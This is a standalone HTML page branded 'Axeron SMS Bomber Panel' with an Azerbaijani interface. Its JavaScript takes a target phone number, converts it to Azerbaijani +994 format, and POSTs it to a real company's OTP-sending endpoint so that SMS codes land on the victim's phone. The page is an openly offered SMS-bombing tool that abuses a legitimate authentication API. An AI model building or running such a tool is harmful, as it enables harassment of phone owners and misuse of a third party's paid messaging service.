<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axeron SMS | Bomber Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { 
            background: #0d1117; 
            color: #c9d1d9; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh;
        }
        .wrapper {
            background: #161b22;
            padding: 40px;
            border-radius: 20px;
            border: 1px solid #30363d;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
        }
        h1 { color: #58a6ff; font-size: 28px; margin-bottom: 10px; letter-spacing: 3px; }
        p { color: #8b949e; font-size: 14px; margin-bottom: 30px; }
        
        .input-group { position: relative; margin-bottom: 20px; }
        input { 
            width: 100%; 
            padding: 15px; 
            border-radius: 10px; 
            border: 1px solid #30363d; 
            background: #010409; 
            color: #fff; 
            font-size: 18px; 
            outline: none;
            text-align: center;
            transition: 0.3s;
        }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 15px rgba(88, 166, 255, 0.2); }
        
        .btn-send { 
            width: 100%; 
            padding: 16px; 
            border-radius: 10px; 
            border: none; 
            background: linear-gradient(45deg, #238636, #2ea043); 
            color: white; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer; 
            text-transform: uppercase;
            transition: 0.3s;
        }
        .btn-send:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(35, 134, 54, 0.3); }
        
        #status-box { 
            margin-top: 25px; 
            padding: 15px; 
            border-radius: 8px; 
            font-size: 14px; 
            font-weight: 600; 
            display: none;
        }
        .footer { margin-top: 30px; font-size: 10px; color: #484f58; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="wrapper">
    <h1>AXERON</h1>
    <p>SMS OTP Göndərmə Paneli</p>
    
    <div class="input-group">
        <input type="text" id="target" placeholder="0501234567" maxlength="10">
    </div>
    
    <button class="btn-send" onclick="startBomb()">SMS GÖNDƏR</button>
    
    <div id="status-box"></div>
    
    <div class="footer">DEVELOPED BY AXERON &copy; 2026</div>
</div>

<script>
    async function startBomb() {
        const phone = document.getElementById('target').value;
        const status = document.getElementById('status-box');
        
        if(phone.length < 9) {
            alert("Düzgün nömrə yaz!");
            return;
        }

        let clean = phone.replace(/\D/g, '');
        if (!clean.startsWith('994')) {
            clean = clean.startsWith('0') ? '994' + clean.substring(1) : '994' + clean;
        }

        status.style.display = "block";
        status.innerText = "⏳ Sorğu göndərilir...";
        status.style.background = "#1f2937";
        status.style.color = "#58a6ff";

        try {
            const response = await fetch("https://api.million.az/api/auth/send-otp", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ msisdn: clean })
            });

            if (response.ok) {
                status.innerText = "✅ SMS UĞURLA GÖNDƏRİLDİ!";
                status.style.background = "rgba(40, 167, 69, 0.1)";
                status.style.color = "#3fb950";
            } else {
                status.innerText = "❌ XƏTA: Limit və ya Server problemi.";
                status.style.background = "rgba(220, 53, 69, 0.1)";
                status.style.color = "#f85149";
            }
        } catch (e) {
            status.innerText = "⚠️ CORS Bloklandı! (Brauzer icazə vermir)";
            status.style.background = "rgba(255, 193, 7, 0.1)";
            status.style.color = "#d29922";
        }
    }
</script>

</body>
</html>
